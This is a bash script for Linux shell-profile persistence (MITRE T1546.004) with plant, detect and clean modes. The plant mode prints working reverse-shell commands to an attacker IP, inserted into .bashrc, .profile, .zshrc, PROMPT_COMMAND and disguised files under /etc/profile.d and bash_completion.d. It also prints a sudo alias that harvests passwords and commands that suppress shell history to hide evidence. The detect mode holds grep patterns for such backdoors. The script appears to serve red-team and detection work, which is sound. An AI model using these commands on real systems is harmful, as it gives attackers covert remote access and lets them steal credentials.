#!/bin/bash
# Shell Profile Persistence
# MITRE ATT&CK: T1546.004 — Event Triggered Execution: Unix Shell Configuration Modification
# Usage: ./bashrc_persistence.sh --plant|--detect|--clean

ATTACKER_IP="${ATTACKER_IP:-10.10.14.1}"
ATTACKER_PORT="${ATTACKER_PORT:-4444}"

plant() {
    local IP="${1:-$ATTACKER_IP}"
    local PORT="${2:-$ATTACKER_PORT}"

    echo "=== Shell Profile Persistence Methods ==="
    echo ""

    # Method 1: .bashrc reverse shell
    echo "[1] .bashrc / .bash_profile (per-user, runs on interactive login)"
    echo ""
    echo "  echo 'bash -i >& /dev/tcp/$IP/$PORT 0>&1 &' >> ~/.bashrc"
    echo "  # Or more covert:"
    echo '  echo '"'"'/bin/bash -c "sleep 30 && bash -i >& /dev/tcp/'"$IP"'/'"$PORT"' 0>&1" &>/dev/null &'"'"' >> ~/.bashrc'
    echo ""

    # Method 2: .profile (Bourne-compatible)
    echo "[2] .profile (runs for login shells — sh, dash, bash with --login)"
    echo ""
    echo "  echo 'nohup bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\" &>/dev/null &' >> ~/.profile"
    echo ""

    # Method 3: .zshrc
    echo "[3] .zshrc (if target uses Zsh)"
    echo ""
    echo "  echo 'nohup bash -c \"bash -i >& /dev/tcp/$IP/$PORT 0>&1\" &>/dev/null &' >> ~/.zshrc"
    echo ""

    # Method 4: /etc/profile.d/ (system-wide, requires root)
    echo "[4] /etc/profile.d/ Drop-In (system-wide, every login)"
    echo ""
    echo "  cat > /etc/profile.d/locale-check.sh << 'EOF'"
    echo '#!/bin/bash'
    echo "(nohup bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' &>/dev/null &) 2>/dev/null"
    echo "EOF"
    echo "  chmod 644 /etc/profile.d/locale-check.sh"
    echo ""

    # Method 5: PROMPT_COMMAND
    echo "[5] PROMPT_COMMAND (runs before every prompt — very persistent)"
    echo ""
    echo '  echo '"'"'export PROMPT_COMMAND="${PROMPT_COMMAND:+$PROMPT_COMMAND;}(if [ ! -f /tmp/.beacon ]; then touch /tmp/.beacon; nohup bash -c \"bash -i >& /dev/tcp/'"$IP"'/'"$PORT"' 0>&1\" &>/dev/null & fi)"'"'"' >> ~/.bashrc'
    echo ""

    # Method 6: Bash completion script
    echo "[6] Bash Completion Backdoor"
    echo ""
    echo "  # Completion scripts in /etc/bash_completion.d/ are sourced on login"
    echo "  cat > /etc/bash_completion.d/system-utils << 'EOF'"
    echo '#!/bin/bash'
    echo "(nohup bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1' &>/dev/null &) 2>/dev/null"
    echo "# Provide legitimate-looking completions"
    echo "complete -W 'status restart reload' systemctl"
    echo "EOF"
    echo ""

    # Method 7: Alias hijacking
    echo "[7] Alias Hijacking (execute payload on common command)"
    echo ""
    echo "  # Hijack sudo — capture password AND run reverse shell"
    echo '  echo '"'"'alias sudo="sudo_backdoor"'"'"' >> ~/.bashrc'
    echo '  echo '"'"'sudo_backdoor() {'
    echo '    read -sp "[sudo] password for $USER: " pass; echo'
    echo '    echo "$USER:$pass:$(date)" >> /tmp/.sudo_log 2>/dev/null'
    echo '    command sudo -S <<< "$pass" "$@"'
    echo '  }'"'"' >> ~/.bashrc'
    echo ""
    echo "  # Hijack ssh — log credentials"
    echo '  echo '"'"'alias ssh="ssh_log"'"'"' >> ~/.bashrc'
    echo '  echo '"'"'ssh_log() { echo "$(date) ssh $@" >> /tmp/.ssh_log 2>/dev/null; command ssh "$@"; }'"'"' >> ~/.bashrc'
    echo ""

    # Method 8: History manipulation
    echo "[8] History Manipulation (hide evidence)"
    echo ""
    echo "  # Disable history for current session"
    echo "  unset HISTFILE"
    echo "  export HISTSIZE=0"
    echo ""
    echo "  # Add to .bashrc to suppress history permanently"
    echo '  echo "export HISTSIZE=0" >> ~/.bashrc'
    echo '  echo "export HISTFILESIZE=0" >> ~/.bashrc'
    echo ""
    echo "  # Redirect history to /dev/null"
    echo '  echo "export HISTFILE=/dev/null" >> ~/.bashrc'
    echo ""
    echo "  # Remove specific commands from history"
    echo "  history -d \$(history | tail -1 | awk '{print \$1}')"
}

detect() {
    echo "=== Shell Profile Persistence Detection ==="
    echo ""

    SUSPICIOUS='(/dev/tcp|nc\s+-[a-z]*e|ncat|socat|curl.*\|.*sh|wget.*\|.*sh|python.*socket|base64.*-d|PROMPT_COMMAND.*tcp|bash.*-i.*>&)'

    echo "[*] Checking user profiles:"
    for home in /root /home/*; do
        for f in .bashrc .bash_profile .profile .zshrc .bash_login .bash_logout; do
            FILE="$home/$f"
            [ -f "$FILE" ] || continue
            MATCH=$(grep -nE "$SUSPICIOUS" "$FILE" 2>/dev/null)
            if [ -n "$MATCH" ]; then
                echo "  [!] SUSPICIOUS in $FILE:"
                echo "$MATCH" | sed 's/^/      /'
            fi
        done
    done

    echo ""
    echo "[*] Checking /etc/profile.d/:"
    for f in /etc/profile.d/*.sh; do
        [ -f "$f" ] || continue
        MATCH=$(grep -nE "$SUSPICIOUS" "$f" 2>/dev/null)
        if [ -n "$MATCH" ]; then
            echo "  [!] SUSPICIOUS in $f:"
            echo "$MATCH" | sed 's/^/      /'
        fi
    done

    echo ""
    echo "[*] Checking /etc/profile and /etc/bash.bashrc:"
    for f in /etc/profile /etc/bash.bashrc /etc/environment; do
        [ -f "$f" ] || continue
        MATCH=$(grep -nE "$SUSPICIOUS|LD_PRELOAD" "$f" 2>/dev/null)
        if [ -n "$MATCH" ]; then
            echo "  [!] SUSPICIOUS in $f:"
            echo "$MATCH" | sed 's/^/      /'
        fi
    done

    echo ""
    echo "[*] Checking bash completion:"
    for f in /etc/bash_completion.d/*; do
        [ -f "$f" ] || continue
        MATCH=$(grep -nE "$SUSPICIOUS" "$f" 2>/dev/null)
        if [ -n "$MATCH" ]; then
            echo "  [!] SUSPICIOUS completion script $f:"
            echo "$MATCH" | sed 's/^/      /'
        fi
    done

    echo ""
    echo "[*] Checking for alias hijacking:"
    for home in /root /home/*; do
        ALIASES=$(grep -n 'alias sudo\|alias ssh\|alias su\b' "$home/.bashrc" 2>/dev/null)
        if [ -n "$ALIASES" ]; then
            echo "  [!] Alias override in $home/.bashrc:"
            echo "$ALIASES" | sed 's/^/      /'
        fi
    done

    echo ""
    echo "[*] Checking PROMPT_COMMAND:"
    for home in /root /home/*; do
        PC=$(grep -n 'PROMPT_COMMAND' "$home/.bashrc" 2>/dev/null)
        if [ -n "$PC" ]; then
            echo "  $home/.bashrc:"
            echo "$PC" | sed 's/^/      /'
        fi
    done

    echo ""
    echo "[*] Users with disabled history:"
    for home in /root /home/*; do
        if grep -q 'HISTSIZE=0\|HISTFILE=/dev/null\|HISTFILESIZE=0' "$home/.bashrc" 2>/dev/null; then
            echo "  [!] History suppressed in $home/.bashrc"
        fi
    done
}

clean() {
    echo "=== Cleanup Commands ==="
    echo ""
    echo "  # Inspect and edit user profiles"
    echo "  vi ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc"
    echo ""
    echo "  # Remove suspicious /etc/profile.d/ scripts"
    echo "  ls -la /etc/profile.d/"
    echo "  rm /etc/profile.d/<suspicious>.sh"
    echo ""
    echo "  # Remove bash completion backdoors"
    echo "  rm /etc/bash_completion.d/<suspicious>"
    echo ""
    echo "  # Restore history settings"
    echo '  echo "HISTSIZE=1000" >> ~/.bashrc'
    echo '  echo "HISTFILESIZE=2000" >> ~/.bashrc'
}

case "$1" in
    --plant)  plant "$2" "$3" ;;
    --detect) detect ;;
    --clean)  clean ;;
    *) echo "Usage: $0 --plant|--detect|--clean" ;;
esac
